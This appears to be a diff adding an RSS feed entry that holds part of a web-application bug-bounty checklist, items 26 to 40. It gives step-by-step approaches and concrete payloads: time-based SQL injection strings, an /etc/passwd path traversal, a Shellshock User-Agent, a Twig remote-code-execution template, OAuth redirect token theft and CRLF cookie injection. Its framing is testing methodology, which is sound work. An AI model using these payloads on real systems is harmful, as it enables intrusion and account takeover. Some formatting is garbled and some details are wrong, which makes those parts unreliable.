+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Capture the forgot password page or any similar request with Burp Suite.&lt;/li&gt;
+&lt;li&gt;Send the request to Intruder.&lt;/li&gt;
+&lt;li&gt;Make multiple requests (e.g., 1000 times) to test for rate limiting issues.&lt;/li&gt;
+&lt;li&gt;This can impact both user and server performance.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;26-password-reset-poisoning&#34;&gt;26. Password Reset Poisoning
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Intercept the forgot password page with Burp Suite.&lt;/li&gt;
+&lt;li&gt;Perform a host header attack.&lt;/li&gt;
+&lt;li&gt;The victim will receive a password reset email from an &amp;ldquo;evil&amp;rdquo; website specified in the host header.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;27-broken-access-control&#34;&gt;27. Broken Access Control
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;IDOR Example:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Access with account 1: &lt;code&gt;https://acme.com/changepw/id?=1234&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Create a second account and access it: &lt;code&gt;https://acme.com/changepw/id?=5678&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Logout from account 1, log into account 2, and attempt to change the password of account 1 by modifying the user ID in the request.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Hash-Based IDOR:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;User IDs might be hashed (e.g., Base64).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Local File Inclusion (LFI) &amp;amp; Path Traversal:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Example request: &lt;code&gt;GET /view?pg=../../../../../etc/passwd%00&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Common Parameters to Look For:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;id&lt;/code&gt;, &lt;code&gt;user&lt;/code&gt;, &lt;code&gt;account&lt;/code&gt;, &lt;code&gt;number&lt;/code&gt;, &lt;code&gt;order&lt;/code&gt;, &lt;code&gt;no&lt;/code&gt;, &lt;code&gt;doc&lt;/code&gt;, &lt;code&gt;key&lt;/code&gt;, &lt;code&gt;email&lt;/code&gt;, &lt;code&gt;group&lt;/code&gt;, &lt;code&gt;profile&lt;/code&gt;, &lt;code&gt;edit&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Functions to Test:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Change email, change password, upgrade/downgrade user role, create/remove/update/delete context-specific app data (e.g., shipping, invoices, document viewing).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Missing Function Level Access Control:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Forceful browsing (e.g., &lt;code&gt;GET /admin/viewTransactions&lt;/code&gt;, &lt;code&gt;GET /ADMIN/viewTransactions&lt;/code&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Parameter Manipulation &amp;amp; Logic Bugs:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Example: Giving a negative price.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Logic Flow Vulnerabilities in E-commerce:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Skipping steps in workflows (e.g., &lt;code&gt;additem-&amp;gt;checkout-&amp;gt;enter shipping info-&amp;gt;payment&lt;/code&gt;).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Tools Used:&lt;/strong&gt; Burp Suite Extensions (AuthMatrix, AuthZ, Authorize, AutoRepeater)&lt;/p&gt;
+&lt;h3 id=&#34;28-account-takeover-via-forgot-password-page&#34;&gt;28. Account Takeover via Forgot Password Page
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Intercept the forgot password page with Burp Suite.&lt;/li&gt;
+&lt;li&gt;Add &lt;code&gt;X-Forwarded-Host: bing.com&lt;/code&gt; to the request header.&lt;/li&gt;
+&lt;li&gt;Forward the request to test for account takeover vulnerabilities.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;29-broken-access-control&#34;&gt;29. Broken Access Control
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Create an account.&lt;/li&gt;
+&lt;li&gt;Change the email ID from A to B.&lt;/li&gt;
+&lt;li&gt;Generate a forgot password request for email A.&lt;/li&gt;
+&lt;li&gt;Repeat the same process for passwords.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;30-rate-limiting-bypass&#34;&gt;30. Rate Limiting Bypass
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Intercept the forgot password page with Burp Suite.&lt;/li&gt;
+&lt;li&gt;Send the request to Intruder.&lt;/li&gt;
+&lt;li&gt;Add &lt;code&gt;X-Forwarded-Host: bing.com&lt;/code&gt; to the request header.&lt;/li&gt;
+&lt;li&gt;Target the request to email and forward it to test for rate limiting bypass.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;31-lack-of-password-confirmation&#34;&gt;31. Lack of Password Confirmation
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Required for actions such as deleting an account or changing an email ID.&lt;/li&gt;
+&lt;li&gt;Verify that a password confirmation step is missing in these processes.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;32-2fa-or-otp-bypass&#34;&gt;32. 2FA or OTP Bypass
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Complete the registration process and request an OTP code.&lt;/li&gt;
+&lt;li&gt;Intercept the OTP request using Burp Suite.&lt;/li&gt;
+&lt;li&gt;Send the intercepted request to Intruder.&lt;/li&gt;
+&lt;li&gt;Bruteforce the 6-digit OTP through Burp Intruder if there’s no rate limiting or CAPTCHA.&lt;/li&gt;
+&lt;li&gt;Analyze content length and attempt multiple combinations until bypassing OTP verification.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;33-blind-sql-injection&#34;&gt;33. Blind SQL Injection
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Check input fields and insert payloads such as &lt;code&gt;id=1&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Insert payloads in user-agent or other input parameters.&lt;/li&gt;
+&lt;li&gt;Confirm by changing the time interval with payloads like:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;id=5+and+1=2&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;,0)waitfor delay&#39;0:0:05&#39;--&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;if(now()=sysdate(),sleep(5),0)) --&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;(select(0)from(select(sleep(3)))v)/*&#39;+(select(3)from(select(sleep(3)))v)+&#39;&amp;quot;&amp;quot;+(select(0)from(select(sleep(3)))v)+&amp;quot;&amp;quot;*/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0&#39;XOR(if(now()=sysdate(),sleep(3),0))XOR&#39;Z&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39; and extractvalue(1,concat(0x0a,@@version)) or&lt;/code&gt;**** or Cookie Manager&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;34-remote-code-execution-vulnerability&#34;&gt;34. Remote Code Execution Vulnerability
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Visit the target website and create an account.&lt;/li&gt;
+&lt;li&gt;Verify the email address and navigate to profile settings.&lt;/li&gt;
+&lt;li&gt;Upload a malicious file (e.g., &lt;code&gt;RCE.php%00.gif&lt;/code&gt;) as the company logo and save.&lt;/li&gt;
+&lt;li&gt;View the uploaded image URL and append &lt;code&gt;?cmd=id&lt;/code&gt; to execute the &lt;code&gt;id&lt;/code&gt; command.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Scenario 2:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Crawl the target website using Burp Suite.&lt;/li&gt;
+&lt;li&gt;Check for &lt;code&gt;/cgi-bin/status&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Send to Repeater and replace &lt;code&gt;User-Agent&lt;/code&gt; with payload like &lt;code&gt;{:;};echo $(&amp;lt;/etc/passwd)&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Send the request to see if it reveals root user info.**** or Manual&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;35-stealing-oauth-token&#34;&gt;35. Stealing OAuth Token
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Log in using a third-party app (e.g., Facebook, Gmail).&lt;/li&gt;
+&lt;li&gt;Intercept the request using Burp Suite.&lt;/li&gt;
+&lt;li&gt;Modify &lt;code&gt;redirect_url&lt;/code&gt; to a domain you control (e.g., &lt;code&gt;bugbountypoc.com&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;If necessary, change the &lt;code&gt;referer&lt;/code&gt; header to the same domain.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;36-external-service-interaction&#34;&gt;36. External Service Interaction
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Capture the request using Burp Suite.&lt;/li&gt;
+&lt;li&gt;Send the request to Repeater.&lt;/li&gt;
+&lt;li&gt;Replace &lt;code&gt;Host&lt;/code&gt; header with Burp Collaborator payload or add a new &lt;code&gt;X-Forwarded-For&lt;/code&gt; header with the same payload.&lt;/li&gt;
+&lt;li&gt;Forward the request and check if Burp Collaborator receives a DNS lookup request.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;37-server-side-include-ssi-injection&#34;&gt;37. Server-Side Include (SSI) Injection
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Intercept the request using Burp Suite.&lt;/li&gt;
+&lt;li&gt;Spider the target host.&lt;/li&gt;
+&lt;li&gt;Search for pages with &lt;code&gt;.shtml&lt;/code&gt; extensions.&lt;/li&gt;
+&lt;li&gt;Inject payloads like &lt;code&gt;&amp;lt;!--#echo var=&amp;quot;DATE_LOCAL&amp;quot; --&amp;gt;&lt;/code&gt; into input fields.&lt;/li&gt;
+&lt;li&gt;Forward the request and check the response for injected data.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;38-client-and-server-side-template-injection&#34;&gt;38. Client and Server-Side Template Injection
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Check if user input is reflected on the webpage. Insert payloads to test for template injection.&lt;/li&gt;
+&lt;li&gt;Common Template Engines:
+&lt;ul&gt;
+&lt;li&gt;FreeMarker (Java-based)&lt;/li&gt;
+&lt;li&gt;Velocity (Java-based)&lt;/li&gt;
+&lt;li&gt;Smarty (PHP-based)&lt;/li&gt;
+&lt;li&gt;Twig (PHP-based)&lt;/li&gt;
+&lt;li&gt;Jade (Node.js-based)&lt;/li&gt;
+&lt;li&gt;Jinja2 (Python/Flask-based)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Manual Checking:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Example Payloads:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;curl -g &#39;&amp;lt;http://www.target.com/page?name=John&#39;&lt;/code&gt;&amp;gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;curl -g &#39;&amp;lt;http://www.target.com/page?name={{7*7}&amp;gt;}&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Automation Tool:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;https://github.com/epinna/tplmap&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Basic Payloads:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;{{7*7}}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;{{7*&#39;7&#39;}}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;{% extends &amp;quot;/etc/passwd&amp;quot; %}&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;RCE Payload (Twig):&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;{{_self.env.registerUndefinedFilterCallback(&amp;quot;exec&amp;quot;)}}{{_self.env.getFilter(&amp;quot;id&amp;quot;)}}&lt;/code&gt;&lt;strong&gt;Tool Used:&lt;/strong&gt; Manual Checking, curl, tplmap&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;39-exif-geolocation-data-not-stripped&#34;&gt;39. Exif GeoLocation Data Not Stripped
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Download an image from &lt;code&gt;https://github.com/ianare/exif-samples&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Go to JPG properties and check GPS data.&lt;/li&gt;
+&lt;li&gt;Upload the image to the target website.&lt;/li&gt;
+&lt;li&gt;Copy the image URL and paste it into an EXIF data tool (e.g., &lt;code&gt;http://metapicz.com/&lt;/code&gt;).&lt;strong&gt;Tool Used:&lt;/strong&gt; &lt;a class=&#34;link&#34; href=&#34;http://exif.regex.info/exif.cgi&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Exif.regex.info/exif.cgi&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;40-crlf-injection&#34;&gt;40. CRLF Injection
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Capture a request using Burp Suite.&lt;/li&gt;
+&lt;li&gt;Insert arbitrary data in the input field (e.g., &lt;code&gt;aaaaaaaaaaaaa&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;If the input is reflected in the response header, it may be vulnerable.&lt;/li&gt;
+&lt;li&gt;Test Carriage Return (&lt;code&gt;%0A&lt;/code&gt;) and Linefeed (&lt;code&gt;%0D&lt;/code&gt;) payloads.&lt;/li&gt;
+&lt;li&gt;Example Payload:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;%0a%0dxxxxxxxxxxxxx&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;return_url=aaaa%0a%0dset-cookie:mycookie&lt;/code&gt;****&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
